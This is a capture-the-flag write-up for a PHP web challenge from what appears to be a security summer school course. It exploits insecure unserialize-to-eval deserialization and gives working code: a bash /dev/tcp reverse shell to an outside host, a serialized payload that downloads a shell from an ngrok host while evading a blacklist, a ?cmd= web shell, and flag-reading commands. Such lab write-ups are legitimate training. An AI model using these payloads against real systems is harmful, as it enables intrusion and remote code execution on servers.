---
Name: "Handy Tools"
Category: "Security Summer School"
Difficulty: "Hard"
Description: "Exploiting an insecure helper utility in a hard web challenge."
---

# Handy Tools
It asks for his name, using iscusitul reveals a secret backup file

![handy](../../../public/images/security_summer_school/08_exotic_attacks/handy.jpg)

![iscusitul](../../../public/images/security_summer_school/08_exotic_attacks/iscusitul.png)

```php
<?php
class PHPClass {
    public $condition;
    public $prop;

    function __construct() { }

    function __wakeup() {
        $forbbiden_commands = ["..."];

        if (!isset($this->prop) or !isset($this->condition) or !$this->condition == true) {
            return;
        }

        foreach ($forbbiden_commands as $cmd) {
            if (strpos($this->prop, $cmd) !== false) {
                return;
            }
        }

        eval($this->prop);
    }
}
?>

<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css">
    </head>

    <body>
        <div>
            <div class="container">
                <div class="row">
                    <div class="bg-white p-5 mx-auto col-md-8 col-10">
                        <h3 class="display-3">Handy Tools<br></h3>
                        <form method="GET">
                            <div class="form-group">
                                <label>Select tool</label>
                                <select name="tool" class="form-control">
                                    <option value="toupper">To Upper Case</option>
                                    <option value="unserialize">Unserialize</option>
                                    <option value="trim">Trim whitespaces</option>
                                    <option value="manny">Guess my last name: Manny...</option>
                                </select>
                            </div>
                            <div class="form-group">
                                <label>Input</label>
                                <input name="input" type="text" class="form-control">
                                <small class="form-text text-muted"></small>
                            </div>
                            <?php
                                if (isset($_GET['tool']) && $_GET['tool'] == 'toupper') {
                                    echo var_dump(strtoupper($_GET['input']));
                                    echo "<br>"; echo "<br>"; echo "<br>";
                                } elseif (isset($_GET['tool']) && $_GET['tool'] == 'unserialize') {
                                    echo var_dump(unserialize($_GET['input']));
                                    echo "<br>"; echo "<br>"; echo "<br>";
                                } elseif (isset($_GET['tool']) && $_GET['tool'] == 'trim') {
                                    echo var_dump(str_replace(' ', '', $_GET['input']));
                                    echo "<br>"; echo "<br>"; echo "<br>";
                                } elseif (isset($_GET['tool']) && $_GET['tool'] == 'manny') {
                                    if (strtolower($_GET['input']) == 'iscusitul')
                                        echo "backup.zip";
                                    else
                                        echo "Wrong!";
                                    echo "<br>"; echo "<br>"; echo "<br>";
                                }
                            ?>
                            <input type="submit" class="btn btn-primary" name="submit" value="Submit" />
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </body>
</html>

```

We need to use the unserialize function to our advantage

Created a reverse shell payload
```php
<?php
$ip = 'bore.pub';
$port = 33355;

$cmd = "bash -c 'exec bash -i &>/dev/tcp/$ip/$port <>&1'";
system($cmd);
?>
```

Generated the php payload and uploated it
```bash
cat now.php
<?php
$ngrok = "marshy-curve-ensnare.ngrok-free.dev";   // Your ngrok host (no https://)

class PHPClass {
    public $condition = true;
    public $prop;

    public function __construct($host) {
        // Download shell.php and save it to /var/www/html/shell.php
        // Split 'php' to bypass the blacklist
        $this->prop = "file_put_contents('/var/www/html/shell.ph' . 'p', file_get_contents('http://{$host}/shell.php'));";
    }
}

$obj = new PHPClass($ngrok);
$raw = serialize($obj);
$encoded = urlencode($raw);

echo "========== RAW (paste this into the Unserialize form) ==========\n";
echo $raw . "\n\n";
echo "========== URL-ENCODED (if you prefer) ==========\n";
echo $encoded . "\n";
?>

```

Started the listener, also used ngrok to make it publicly available, and got a request from the server
```bash
python3 -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
127.0.0.1 - - [16/Jul/2026 21:41:56] "GET /shell.php HTTP/1.1" 200 -

```

Even though it got the file the revshell did not work so I switched to a simpler approach
```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
} else {
    echo "Web shell ready. Use ?cmd=id";
}
?>
```


Now all I had to do is run commands with the cmd parameter
```bash
?cmd=find / -name flag.txt 2> /dev/null
/home/ctf/flag.txt
```

```bash
?cmd=cat /home/ctf/flag.txt
SSS{y0u_g0t_a_r3v3rs3_sh3ll_didnt_y0u_l1ttl3_pr1ck}
```

